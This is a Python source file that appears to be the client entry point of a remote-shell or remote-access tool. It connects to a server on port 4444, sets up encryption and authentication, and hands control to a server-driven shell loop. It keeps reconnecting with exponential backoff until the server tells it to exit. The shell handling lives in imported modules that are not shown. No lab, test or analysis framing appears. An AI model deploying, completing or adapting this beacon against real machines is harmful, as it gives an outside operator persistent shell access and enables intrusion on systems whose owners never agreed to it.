import socket
import time
import json
from modules.communication import initialize_connection, shell_loop
from modules.authentication import authenticate_with_server
from modules.encryption import initialize_encryption

# Exponential Backoff Parameters
INITIAL_BACKOFF = 5  # Seconds
MAX_BACKOFF = 60  # Seconds
BACKOFF_FACTOR = 2

if __name__ == '__main__':
    backoff = INITIAL_BACKOFF
    while True:
        try:
            # using config file
            # with open('config/config.json') as f:
            #     config = json.load(f)
            # server_ip = config['server_ip']
            # server_port = config['server_port']

            server_ip = '127.0.0.1'
            server_port = 4444  # Replace with your server's port
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))
            print(f"[+] Connected to server {server_ip}:{server_port}")
            
            # Initialize encryption and authentication
            initialize_encryption(sock)
            if not authenticate_with_server(sock):
                print("[-] Authentication failed. Retrying...")
                sock.close()
                time.sleep(backoff)
                backoff = min(backoff * BACKOFF_FACTOR, MAX_BACKOFF)
                continue
                
            initialize_connection(sock)
            should_exit_program = shell_loop(sock)
            backoff = INITIAL_BACKOFF  # Reset backoff on success
            if should_exit_program:
                print("[-] Exiting client program as per server command.")
                break
            sock.close()
        except socket.error as e:
            print(f"[-] Socket error: {e}. Retrying in {backoff} seconds...")
            time.sleep(backoff)
            backoff = min(backoff * BACKOFF_FACTOR, MAX_BACKOFF)
        except Exception as e:
            print(f"[!] Unhandled error in main loop: {e}. Retrying in {backoff} seconds...")
            time.sleep(backoff)
            backoff = min(backoff * BACKOFF_FACTOR, MAX_BACKOFF)